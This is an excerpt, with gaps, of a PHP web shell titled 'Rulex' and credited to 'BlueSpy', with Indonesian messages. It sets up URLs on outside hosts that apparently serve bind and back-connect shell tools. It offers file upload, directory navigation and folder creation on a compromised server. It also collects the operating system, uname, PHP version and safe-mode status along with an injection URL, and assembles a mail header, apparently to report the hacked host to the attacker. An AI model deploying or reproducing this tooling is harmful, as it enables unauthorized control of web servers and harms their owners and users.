...
<body >
<center><h2>Rulex</h2></center>
';
@set_time_limit(0);
$string = $_SERVER['QUERY_STRING'];
$mhost = 'http://www.permaya.org/x?';
...
$btname = 'backtool.txt';
$bt = 'http://www.revitalizemassage.com/xpl/bind';
$dc = 'http://www.revitalizemassage.com/xpl/back.txt';
...
if (@chdir("$chdir")) {
    $msg = "<font color=\"#008000\"> Directory Door, OK!</font>";
} else {
    $msg = "<font color=\"#FF0000\">Error: Could not enter folder!</font>";
...
color=\"#000080\">{$_FILES['userfile']['name']}</font>, archieve valid, uploading complete. 

</font>";
    } else {
        $msg = "<font color=\"#FF0000\">Error: couldnt upload file on server.</font>";
    }
...
Created. </font>";
        ...
        $msg = "<font color=\"#FF0000\">Error: Folder Make Error.</font>";
    }
...
dibuat! ye ke? </font>";
        ...
        $msg = "<font color=\"#FF0000\">Error: Pembuatan arsip gagal! entah?</font>";
    }
...
$psn = ("OS = " . $OS . "<BR>UNAME = " . $UNAME . "<BR>PHPVersion = " . $PHPv . "<BR>Safe Mode = " . $SafeMode . "<BR><font color=blue>http://" . $injek . "</font><BR>Ingat jangan pakai Injek Ini.<BR>By: BlueSpy");
$header = "From: $_SERVER[HTTP_HOST] <$from>
Reply-To: $replyto
";
